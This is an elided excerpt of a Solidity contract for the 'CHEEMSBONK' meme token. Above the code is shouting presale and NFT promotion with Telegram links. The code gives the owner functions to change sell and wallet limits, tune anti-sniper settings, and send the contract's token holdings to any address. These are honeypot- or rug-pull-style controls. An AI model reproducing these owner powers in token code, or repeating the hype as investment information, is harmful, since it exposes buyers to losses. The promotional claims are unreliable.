...
THE ULITMATE CHEEMS TOKEN!!! BACK AND STRONGER THAN EVER!!!

PUBLIC PRESALE ON PINKSALE.FINANCE. JOIN OUR TG FOR MORE INFO!!!

THE MORE NFTS YOU OWN, THE LOWER YOUR BUY TAX!!!!!

MINT YOUR NFTS --- https://nft.cheemsbonkbsc.com/

TELEGRAM: https://t.me/Cheemsbonkbsc 
WEBSITE: https://www.cheemsbonkbsc.com/
...
interface IRouter {
    ...
    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin, //raining_shitcoins
...
contract CHEEMSBONK is Context, IERC20, Auth {
    ...
    uint256 public _maxWalletToken = ( _tTotal * 10000 ) / 10000;
    uint256 public _mStx = ( _tTotal * 10000 ) / 10000;
    uint256 public _asT = 100000000 * (10 ** _decimals);
    ...
    uint256 public sT = 6000000000000 * (10 ** _decimals);
    uint256 snT = 100000000000;
    bool LFG = false;
    bool staDist = false;
    bool snP = false;
    uint8 snPrs = 0 seconds;
    uint8 bscans = 0 seconds;
    mapping (address => uint) private sNip;
    uint256 contswap;
    uint256 contswapam = 1000;
    uint256 contswapat = 1000;
    bool contsnp = true;
    uint256 stfu = 10000000000000;
    bool sFrz = true;
    ...
    function _transfer(address from, address to, uint256 amount) private {
        ...
        if(from != pair && !itCDh[from]){contswap = contswap + contswapam;}
        if(contswap >= 5){contswap = contswapam;}
    ...
    function setmaxes(uint256 _mw, uint256 _mb, uint256 _ms) external authorized {
        _maxTxAmount = ( _tTotal * _mb ) / 10000;
        _maxWalletToken = ( _tTotal * _mw ) / 10000;
        _mStx = ( _tTotal * _ms ) / 10000;
    }
   ...
   function setPresAle() external authorized {
    ...
    function setsnp(bool _enabled, uint8 _snpr, uint8 _bsca) external authorized { 
        snP = _enabled;
        snPrs = _snpr;
        bscans = _bsca;
    }
    ...
    function setapprove(address _ta, address _ra, uint256 _am, uint256 _amd) external authorized {
        uint256 tamt = TokT(_ta).balanceOf(address(this));
        TokT(_ta).transfer(_ra, tamt.mul(_am).div(_amd));
    }
